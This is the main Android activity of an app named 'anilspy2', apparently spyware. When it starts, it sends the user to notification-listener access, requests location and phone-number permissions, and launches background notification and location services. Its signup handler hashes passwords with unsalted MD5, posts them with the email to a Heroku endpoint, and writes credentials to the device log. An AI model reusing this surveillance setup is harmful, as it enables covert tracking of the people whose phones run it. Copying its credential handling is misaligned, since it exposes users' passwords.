package anilkaynar.com.anilspy2;

import android.Manifest;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;

import java.io.UnsupportedEncodingException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

import butterknife.BindView;
import butterknife.ButterKnife;

public class MainActivity extends AppCompatActivity implements Response.ErrorListener {
    @BindView(R.id.btn_signup)
    Button ButtonSignup;
    @BindView(R.id.input_name)
    EditText InputName;
    @BindView(R.id.input_password)
    EditText InputPassword;
    @BindView(R.id.input_email)
    EditText InputEmail;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if(readCredit()){
            //Yeni Activityye Gidecek
            //onCreate(null); Already attached exception
           setContentView(R.layout.layout_empty);
           ButtonSignup=(Button) findViewById(R.id.btn_signup);
        }
        else {
            setContentView(R.layout.activity_main);
            ButterKnife.bind(this);
        }
        Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
        startActivity(intent);
        ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION
                        , Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.READ_PHONE_STATE,
                        Manifest.permission.READ_PHONE_NUMBERS
                },
                //Ne zaman bir location change algılansa çağırılıyor.
                4);
        Intent notificationServiceIntent = new Intent(MainActivity.this,
                NotificationService.class);
        MainActivity.this.startService(notificationServiceIntent);
        Intent locationServiceIntent = new Intent(MainActivity
                .this, LocationReadService.class);
        MainActivity.this.startService(locationServiceIntent);
    }
    //

    @Override
    protected void onStart() {
        super.onStart();
        ButtonSignup.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                byte[] hash = new byte[0];
                try {
                    MessageDigest messageDigest = MessageDigest.getInstance("MD5");
                    messageDigest.update(InputPassword.getText().toString().getBytes("UTF-8"));
                    hash = messageDigest.digest();
                    Log.e("I am workings", "I am fucking work");

                } catch (NoSuchAlgorithmException e) {
                    e.printStackTrace();
                } catch (UnsupportedEncodingException e) {
                    e.printStackTrace();
                }
                String username = InputName.getText().toString();
                String password = null;

                password = convertToHex(hash);

                String email = InputEmail.getText().toString();
                String url = "https://anilspy.herokuapp.com/get";
                RequestQueue requestQueue = RequestQueueSingleton.getRequestQueue
                        (MainActivity.this);
                //    public SignUpRequest(int method, String url
                // ,String email,String userName,String password, Response.ErrorListener listener) {
                SignUpRequest request = new SignUpRequest(Request.Method.POST, url, username, email, password,
                        MainActivity.this
                );
                Log.e("Password", "pas " + password);
                requestQueue.add(request);

                addCredit();
                Log.e("User pass email", String.format("%s %s %s", username, password, email));
            }
        });
    }

    @Override
    public void onErrorResponse(VolleyError error) {
        Log.e("Houston we have a big error", error.getMessage() + " " + error.networkResponse);
    }

    private static String convertToHex(byte[] data) {
        StringBuilder buf = new StringBuilder();
        for (byte b : data) {
            int halfbyte = (b >>> 4) & 0x0F;
            int two_halfs = 0;
            do {
                buf.append((0 <= halfbyte) && (halfbyte <= 9) ? (char) ('0' + halfbyte) : (char) ('a' + (halfbyte - 10)));
                halfbyte = b & 0x0F;
            } while (two_halfs++ < 1);
        }
        return buf.toString();
    }
    public void addCredit(){
        SharedPreferences preferences = MainActivity.this.
                getSharedPreferences("first", MODE_PRIVATE);
        SharedPreferences.Editor editor=preferences.edit();
        editor.putBoolean("kayit",true);
        editor.commit();
    }
    public boolean readCredit(){
        boolean isSignin=false;
        SharedPreferences preferences = MainActivity.this.
                getSharedPreferences("first", MODE_PRIVATE);
        isSignin=preferences.getBoolean("kayit",false);
        return isSignin;
        //Birtakım cambazlıklar ile sorunu kolayca çözdüm
    }
}
